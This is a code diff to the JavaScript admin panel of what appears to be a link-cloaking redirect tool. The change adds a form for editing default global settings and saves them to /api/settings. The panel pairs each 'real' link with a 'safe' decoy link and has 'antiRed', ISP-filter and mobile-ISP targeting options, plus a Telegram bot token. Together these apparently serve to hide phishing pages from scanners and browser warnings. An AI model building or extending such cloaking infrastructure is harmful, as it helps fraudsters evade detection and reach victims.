@@ -392,11 +392,13 @@
                         <div style="color: #dc3545;">Safe: ${link.nonRealLink}</div>
                     </td>
                     <td style="padding: 10px; border: 1px solid #ddd;">
-                        ${link.isDefault ? '<span style="color: gray;">Permanent</span>' : 
-                          `<div style="display: flex; gap: 5px;">
-                            <button onclick="editLink('${link.slug}', '${link.name}', '${link.realLink}', '${link.nonRealLink}', ${link.antiRed}, ${link.ispFilter}, ${JSON.stringify(link.mobileIsps).replace(/"/g, '&quot;')}, ${link.reallowVisited})" style="background: #ffc107; color: black; padding: 5px 10px; font-size: 0.8em;">Edit</button>
-                            <button onclick="deleteLink('${link.slug}')" style="background: #dc3545; padding: 5px 10px; font-size: 0.8em;">Delete</button>
-                           </div>`}
+                        <div style="display: flex; gap: 5px;">
+                            <button onclick="${link.isDefault ? 
+                                `editDefaultLink('${link.slug}', '${link.realLink}', '${link.nonRealLink}', ${settings.antiRed}, ${settings.ispFilter}, ${JSON.stringify(settings.mobileIsps).replace(/"/g, '&quot;')}, ${settings.reallowVisited})` : 
+                                `editLink('${link.slug}', '${link.name}', '${link.realLink}', '${link.nonRealLink}', ${link.antiRed}, ${link.ispFilter}, ${JSON.stringify(link.mobileIsps).replace(/"/g, '&quot;')}, ${link.reallowVisited})`}" 
+                                style="background: #ffc107; color: black; padding: 5px 10px; font-size: 0.8em;">Edit</button>
+                            ${link.isDefault ? '' : `<button onclick="deleteLink('${link.slug}')" style="background: #dc3545; padding: 5px 10px; font-size: 0.8em;">Delete</button>`}
+                        </div>
                     </td>
                 `;
                 tbody.appendChild(tr);
@@ -430,9 +432,11 @@
             document.getElementById('formTitle').innerText = 'Edit Link: ' + name;
             document.getElementById('editOldSlug').value = slug;
             document.getElementById('newLinkName').value = name;
+            document.getElementById('newLinkName').parentElement.style.display = 'block';
             document.getElementById('newRealLink').value = real;
             document.getElementById('newNonRealLink').value = nonReal;
             document.getElementById('newCustomSlug').value = slug;
+            document.getElementById('newCustomSlug').parentElement.style.display = 'block';
 
             document.getElementById('newAntiRed').checked = antiRed !== false;
             document.getElementById('newIspFilter').checked = ispFilter !== false;
@@ -445,13 +449,63 @@
             document.getElementById('linkFormContainer').scrollIntoView({ behavior: 'smooth' });
         }
 
+        function editDefaultLink(slug, real, nonReal, antiRed, ispFilter, mobileIsps, reallowVisited) {
+            document.getElementById('formTitle').innerText = 'Edit Default (Global) Settings';
+            document.getElementById('editOldSlug').value = 'DEFAULT';
+            document.getElementById('newLinkName').value = 'Default Link';
+            document.getElementById('newLinkName').parentElement.style.display = 'none'; // Name not editable for default
+            document.getElementById('newRealLink').value = real;
+            document.getElementById('newNonRealLink').value = nonReal;
+            document.getElementById('newCustomSlug').value = slug;
+            document.getElementById('newCustomSlug').parentElement.style.display = 'none'; // Slug not editable for default
+
+            document.getElementById('newAntiRed').checked = antiRed !== false;
+            document.getElementById('newIspFilter').checked = ispFilter !== false;
+            document.getElementById('newReallowVisited').checked = reallowVisited !== false;
+            renderNewLinkIspList(mobileIsps || []);
+            
+            document.getElementById('submitLinkBtn').innerText = 'Save Global Settings';
+            document.getElementById('submitLinkBtn').onclick = saveAllSettings;
+            document.getElementById('cancelEditBtn').style.display = 'inline-block';
+            document.getElementById('linkFormContainer').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        async function saveAllSettings() {
+            const settings = {
+                nonRealLink: document.getElementById('newNonRealLink').value,
+                realLink: document.getElementById('newRealLink').value,
+                antiRed: document.getElementById('newAntiRed').checked,
+                ispFilter: document.getElementById('newIspFilter').checked,
+                mobileIsps: getNewLinkSelectedIsps(),
+                reallowVisited: document.getElementById('newReallowVisited').checked,
+                botToken: document.getElementById('botToken').value.trim(),
+                chatId: document.getElementById('chatId').value.trim()
+            };
+
+            const res = await fetch('/api/settings', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(settings)
+            });
+
+            if (res.ok) {
+                alert('Global Settings saved!');
+                cancelEdit();
+                loadData();
+            } else {
+                alert('Error saving settings');
+            }
+        }
+
         function cancelEdit() {
             document.getElementById('formTitle').innerText = 'Create New Link';
             document.getElementById('editOldSlug').value = '';
             document.getElementById('newLinkName').value = '';
+            document.getElementById('newLinkName').parentElement.style.display = 'block';
             document.getElementById('newRealLink').value = '';
             document.getElementById('newNonRealLink').value = '';
             document.getElementById('newCustomSlug').value = '';
+            document.getElementById('newCustomSlug').parentElement.style.display = 'block';
 
             document.getElementById('newAntiRed').checked = true;
             document.getElementById('newIspFilter').checked = true;
